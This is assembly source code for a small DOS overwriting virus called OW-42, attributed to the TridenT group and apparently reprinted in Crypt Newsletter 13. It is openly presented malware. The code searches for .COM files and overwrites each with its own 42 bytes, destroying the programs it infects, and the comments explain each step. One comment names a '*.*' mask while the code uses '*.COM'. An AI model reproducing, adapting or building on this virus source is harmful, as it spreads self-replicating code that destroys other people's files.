;OW-42 virus - TridenT group, edited for Crypt Newsletter 13
;


CODE    SEGMENT
	ASSUME  CS:CODE, DS:CODE, ES:CODE, SS:NOTHING

	org     0100h

start:  mov     ah,4Eh                  ; find first file
recurse: 
	mov     dx,0123h                ; matching filemask, "*.*"
	int     21h                     


	db      72h,20h                 ;hand-coded jump on carry to
					;exit if no more files found
	mov     ax,3D01h                
	mov     dx,009Eh                
	int     21h                     
	
	mov     bh,40h                  
	mov     dx,0100h                ;starting from beginning
	xchg    ax,bx                   ;put handle in ax
	mov     cl,2Ah                  ;to write: 42 bytes of virus 
	int     21h                     ;write the virus
	mov     ah,3Eh                  ;close the file
	int     21h                     
	
	mov     ah,4Fh                  ;find next file
	jmp     Short recurse


	db    "*.COM"     ;file_mask 
	dw     0C300h     ;hand-coded return

CODE    ENDS
	END     START

